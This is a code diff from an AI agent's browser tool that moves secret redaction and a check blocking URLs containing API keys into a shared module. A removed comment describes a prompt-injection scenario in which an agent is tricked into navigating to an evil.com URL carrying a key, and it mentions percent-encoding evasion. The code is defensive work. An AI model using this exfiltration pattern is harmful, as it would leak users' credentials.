@@ -2666,25 +2666,9 @@ def _truncate_snapshot(snapshot_text: str, max_chars: int = 8000) -> str:
     return '\n'.join(result)
 
 
-def _redact_browser_output(value: Any) -> Any:
-    """Redact secrets from browser-originated data before returning to the model.
-
-    Browser snapshots, console messages, JS exceptions, and eval results can
-    contain page-rendered API keys, cookies, bearer tokens, or pasted secrets.
-    Tool output is a model boundary, so force redaction here even if global log
-    redaction is disabled for debugging.
-    """
-    from agent.redact import redact_sensitive_text
-
-    if isinstance(value, str):
-        return redact_sensitive_text(value, force=True)
-    if isinstance(value, list):
-        return [_redact_browser_output(item) for item in value]
-    if isinstance(value, tuple):
-        return tuple(_redact_browser_output(item) for item in value)
-    if isinstance(value, dict):
-        return {key: _redact_browser_output(item) for key, item in value.items()}
-    return value
+# Shared with browser_cdp_tool / browser_camofox — one walker for the whole
+# browser family so the boundary can't drift per-module again.
+from tools.browser_boundary import redact_browser_output as _redact_browser_output
 
 
 # ============================================================================
@@ -2702,27 +2686,16 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     Returns:
         JSON string with navigation result (includes stealth features info on first nav)
     """
-    # Secret exfiltration protection — block URLs that embed API keys or
-    # tokens in query parameters. A prompt injection could trick the agent
-    # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
-    # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
-    import urllib.parse
-    from agent.redact import _PREFIX_RE
-    url_decoded = urllib.parse.unquote(url)
-    if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
-        return json.dumps({
-            "success": False,
-            "error": "Blocked: URL contains what appears to be an API key or token. "
-                     "Secrets must not be sent in URLs.",
-        })
+    # Secret exfiltration protection — checked both before and after URL
+    # normalization (normalization can surface a percent-hidden match).
+    from tools.browser_boundary import secret_in_url_error
+    secret_err = secret_in_url_error(url)
+    if secret_err:
+        return json.dumps({"success": False, "error": secret_err})
     url = _normalize_url_for_request(url)
-    normalized_decoded = urllib.parse.unquote(url)
-    if _PREFIX_RE.search(url) or _PREFIX_RE.search(normalized_decoded):
-        return json.dumps({
-            "success": False,
-            "error": "Blocked: URL contains what appears to be an API key or token. "
-                     "Secrets must not be sent in URLs.",
-        })
+    secret_err = secret_in_url_error(url)
+    if secret_err:
+        return json.dumps({"success": False, "error": secret_err})
 
     # SSRF protection — block private/internal addresses before navigating.
     # Skipped for local backends (Camofox, headless Chromium without a cloud
